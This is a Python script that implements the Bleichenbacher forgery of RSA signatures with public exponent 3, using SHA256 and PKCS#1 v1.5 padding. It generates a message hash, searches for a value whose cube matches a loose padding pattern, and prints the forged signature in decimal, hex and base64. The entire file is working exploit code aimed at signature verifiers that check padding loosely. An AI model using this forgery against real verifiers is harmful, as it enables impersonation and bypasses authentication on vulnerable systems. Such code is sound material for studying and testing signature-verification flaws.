import hashlib
import random
import string
import math 
import base64 
import re 

def alpha_and_beta_computation(s_n):
    
    validation_test = s_n%3
    if validation_test:
        print("[!] The forgery attack only works with RSA modulus whose size is divisible by 3")
        exit()

    alpha = (s_n-15)//3
    # the 847 value here is designed for SHA256, with another hash algorithm we would have put another value  
    beta = int((s_n//3 - 847 + math.log2(3))//1) 
    return alpha, beta

def signature_generation(a, alpha, beta):
    return (2**alpha)-(a//3)*(2**beta)

# useless for this script I just let it here for a future upgrade
def garbage_computation(a, alpha, beta):
    print(a**2%3)
    print(a**3%27)
    return ((a**2)//3)*(2**(alpha+2*beta))-((a**3)//27)*(2**3)*beta


def a_generation():
    # this value correspond to the ASN value for the SHA256 algorithm
    asn_val = 1074720622405046283428835398852229154138489888
    letters = string.ascii_letters + string.digits

    # there is two conditions on the a generation : 
    #       a = 2^416-(asn_val*2^256 + H(m))
    #       a must be divisible by 3 
    
    a = 1
    while a%3!=0:
        message = ''.join(random.choice(letters) for _ in range(6))
        hash_object = hashlib.sha256()
        hash_object.update(message.encode('utf-8'))
        hex_dig = hash_object.hexdigest()
        hash_integer = int(hex_dig, 16)
        a = 2**416 - (asn_val*(2**256)+hash_integer)

    print("The message used for the attack is ", message)


    return a


def main(): 
    
    
    
    # This script replicates the bleichenbacher attack forgery signature using SHA256 and an arbitrary RSA modulus size
    # For the public exponent this script only works with e=3

    # n corresponds to the RSA modulus 
    # s_n size of the RSA modulus in bits 
    s_n = 2736 


    if s_n < 1739 : 
        print("[!] The forgery attack based in this algorithm only works with RSA modulus larger than 1739 bits...")
        exit()
    
    print("[+] a computation...")
    a = a_generation()

    print(" ")

    print("[+] Alpha and beta computation...")
    alpha, beta = alpha_and_beta_computation(s_n)

    print(" ")

    print("======================================================================")

    # In the regex I removed the first \x00 because python just delete it but the value still works
    pattern = r"^01(ff)+(ff003031300d060960864801650304020105000420)(.*)$"
    
    # just to test if the regex works 
    # test_pattern = b'\x01\xff\xff\xff\x00\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20\x01\x02\x03'
    # print(bool(re.match(pattern, test_pattern.hex())))

    hex_str = b'\x00'.hex()

    while not bool(re.match(pattern, hex_str)) and beta >0:
        print("[+] Signature generation...")
        print(" ")
        signature = signature_generation(a, alpha, beta)
        beta -=1
        validation_test = signature**3
        bytes_validation_test = int.to_bytes(validation_test,(validation_test.bit_length()+7)//8)
        hex_str = bytes_validation_test.hex()

    if beta==0:
        print("[!] The attack didn't work :(")
        exit()

    print("[+] The signature in decimal format is ", signature)

    print(" ")

    bytes_signature = int.to_bytes(signature, (signature.bit_length()+7)//8)
    print("[+] The signature in hexadecimal format is ",bytes_signature)

    print(" ")

    print("[+] The signature in base64 encoding is ",base64.b64encode(bytes_signature))

    # garbage = garbage_computation(a, alpha, beta)


main()